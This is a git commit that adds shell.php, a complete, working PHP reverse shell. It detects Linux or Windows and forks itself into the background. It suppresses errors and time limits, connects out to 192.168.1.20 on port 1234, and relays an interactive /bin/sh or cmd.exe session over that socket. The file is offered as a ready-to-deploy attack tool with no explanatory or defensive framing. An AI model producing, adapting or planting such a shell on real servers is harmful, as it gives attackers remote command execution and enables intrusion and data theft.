559a59907d806414289e9fe4545f250d56e4dcae
temorubun <51144412+temorubun@users.noreply.github.com>
2024-11-03 11:37:22 +0900

    Create shell.php

---
+++ shell.php
@@ -0,0 +1,155 @@
+<?php
+class Shell {
+    private $addr  = null;
+    private $port  = null;
+    private $os    = null;
+    private $shell = null;
+    private $descriptorspec = array(
+        0 => array('pipe', 'r'), // shell can read from STDIN
+        1 => array('pipe', 'w'), // shell can write to STDOUT
+        2 => array('pipe', 'w')  // shell can write to STDERR
+    );
+    private $buffer = 1024;  // read/write buffer size
+    private $clen   = 0;     // command length
+    private $error  = false; // stream read/write error
+    private $sdump  = true;  // script's dump
+    public function __construct($addr, $port) {
+        $this->addr = $addr;
+        $this->port = $port;
+    }
+    private function detect() {
+        $detected = true;
+        $os = PHP_OS;
+        if (stripos($os, 'LINUX') !== false || stripos($os, 'DARWIN') !== false) {
+            $this->os    = 'LINUX';
+            $this->shell = '/bin/sh';
+        } else if (stripos($os, 'WINDOWS') !== false || stripos($os, 'WINNT') !== false || stripos($os, 'WIN32') !== false) {
+            $this->os    = 'WINDOWS';
+            $this->shell = 'cmd.exe';
+        } else {
+            $detected = false;
+            echo "SYS_ERROR: Underlying operating system is not supported, script will now exit...\n";
+        }
+        return $detected;
+    }
+    private function daemonize() {
+        $exit = false;
+        if (!function_exists('pcntl_fork')) {
+            echo "DAEMONIZE: pcntl_fork() does not exist, moving on...\n";
+        } else if (($pid = @pcntl_fork()) < 0) {
+            echo "DAEMONIZE: Cannot fork off the parent process, moving on...\n";
+        } else if ($pid > 0) {
+            $exit = true;
+            echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...\n";
+        } else if (posix_setsid() < 0) {
+            echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\n";
+        } else {
+            echo "DAEMONIZE: Completed successfully!\n";
+        }
+        return $exit;
+    }
+    private function settings() {
+        @error_reporting(0);
+        @set_time_limit(0);
+        @umask(0);
+    }
+    private function dump($data) {
+        if ($this->sdump) {
+            $data = str_replace('<', '&lt;', $data);
+            $data = str_replace('>', '&gt;', $data);
+            echo $data;
+        }
+    }
+    private function read($stream, $name, $buffer) {
+        if (($data = @fread($stream, $buffer)) === false) {
+            $this->error = true;
+            echo "STRM_ERROR: Cannot read from {$name}, script will now exit...\n";
+        }
+        return $data;
+    }
+    private function write($stream, $name, $data) {
+        if (($bytes = @fwrite($stream, $data)) === false) {
+            $this->error = true;
+            echo "STRM_ERROR: Cannot write to {$name}, script will now exit...\n";
+        }
+        return $bytes;
+    }
+    private function rw($input, $output, $iname, $oname) {
+        while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {
+            if ($this->os === 'WINDOWS' && $oname === 'STDIN') { $this->clen += strlen($data); }
+            $this->dump($data);
+        }
+    }
+    private function brw($input, $output, $iname, $oname) {
+        $size = fstat($input)['size'];
+        if ($this->os === 'WINDOWS' && $iname === 'STDOUT' && $this->clen) {
+            while ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->read($input, $iname, $bytes)) {
+                $this->clen -= $bytes;
+                $size -= $bytes;
+            }
+        }
+        while ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->read($input, $iname, $bytes)) && $this->write($output, $oname, $data)) {
+            $size -= $bytes;
+            $this->dump($data);
+        }
+    }
+    public function run() {
+        if ($this->detect() && !$this->daemonize()) {
+            $this->settings();
+            $socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);
+            if (!$socket) {
+                echo "SOC_ERROR: {$errno}: {$errstr}\n";
+            } else {
+                stream_set_blocking($socket, false);
+                $process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null);
+                if (!$process) {
+                    echo "PROC_ERROR: Cannot start the shell\n";
+                } else {
+                    foreach ($pipes as $pipe) {
+                        stream_set_blocking($pipe, false);
+                    }
+                    $status = proc_get_status($process);
+                    @fwrite($socket, "SOCKET: Shell has connected! PID: {$status['pid']}\n");
+                    do {
+                        $status = proc_get_status($process);
+                        if (feof($socket)) {
+                            echo "SOC_ERROR: Shell connection has been terminated\n"; break;
+                        } else if (feof($pipes[1]) || !$status['running']) {
+                            echo "PROC_ERROR: Shell process has been terminated\n"; break;
+                        }
+                        $streams = array(
+                            'read'   => array($socket, $pipes[1], $pipes[2]),
+                            'write'  => null,
+                            'except' => null
+                        );
+                        $num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0);
+                        if ($num_changed_streams === false) {
+                            echo "STRM_ERROR: stream_select() failed\n"; break;
+                        } else if ($num_changed_streams > 0) {
+                            if ($this->os === 'LINUX') {
+                                if (in_array($socket  , $streams['read'])) { $this->rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); }
+                                if (in_array($pipes[2], $streams['read'])) { $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); }
+                                if (in_array($pipes[1], $streams['read'])) { $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); }
+                            } else if ($this->os === 'WINDOWS') {
+                                if (in_array($socket, $streams['read'])/*------*/) { $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); }
+                                if (($fstat = fstat($pipes[2])) && $fstat['size']) { $this->brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); }
+                                if (($fstat = fstat($pipes[1])) && $fstat['size']) { $this->brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); }
+                            }
+                        }
+                    } while (!$this->error);
+                    foreach ($pipes as $pipe) {
+                        fclose($pipe);
+                    }
+                    proc_close($process);
+                }
+                fclose($socket);
+            }
+        }
+    }
+}
+echo '<pre>';
+$sh = new Shell('192.168.1.20', 1234);
+$sh->run();
+unset($sh);
+echo '</pre>';
+?>
